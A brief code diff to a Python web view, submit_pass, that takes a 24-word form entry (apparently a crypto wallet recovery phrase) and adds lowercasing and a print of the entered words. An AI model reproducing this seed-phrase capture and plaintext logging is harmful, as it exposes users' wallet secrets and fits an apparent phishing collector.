@@ -75,7 +75,10 @@ def submit_pass(request):
     formatted_time = current_time.strftime("%Y-%m-%d %H:%M:%S")
     if request.method == "POST":
         keys = request.POST.get('mf-text', '')
+        keys = keys.lower()
         words = keys.split()
+
+        print(keys)
         
 
         if len(words) != 24:
